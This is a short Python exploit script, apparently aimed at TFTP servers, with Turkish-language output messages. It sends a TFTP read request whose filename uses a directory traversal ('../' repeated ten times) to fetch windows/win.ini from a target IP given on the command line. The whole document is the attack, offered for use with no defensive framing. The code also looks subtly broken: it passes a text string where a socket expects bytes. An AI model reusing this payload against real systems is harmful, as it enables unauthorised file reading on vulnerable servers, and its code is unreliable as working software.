import sys, socket
from colorama import Fore

def sendPacket(HOST, PORT, data):
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    udp_sock.sendto(data, (HOST, PORT))
    data = udp_sock.recv(1024)
    udp_sock.close()
    return data

if __name__ == "__main__":
    if len(sys.argv) < 2:
        # "\tUsage: python exploit.py target_ip"
        # "\tExample : python exploit.py 127.0.0.1"
        # "\tExiting..."
        sys.exit(0)

    HOST = sys.argv[1]                               ## The Server IP
    PORT = 69                                        ## Default TFTP port

    data = "\x00\x01"                                ## TFTP Read Request
    data += "../" * 10 + "windows/win.ini" + "\x00"  ## Read win.ini file using directory traversal
    data += "netascii\x00"                           ## TFTP Type

    # netascii
    rec_data = sendPacket(HOST, PORT, data)
    num = 0
    print(Fore.YELLOW+'[+]'+Fore.RESET+f' Hedef UDP paketlerinde bulunan veriler (datalar), {HOST}')
    for i in rec_data.strip():
        num += 1
        print(Fore.BLUE+'[i]'+Fore.RESET+f' Veri (data) {num}: {i}')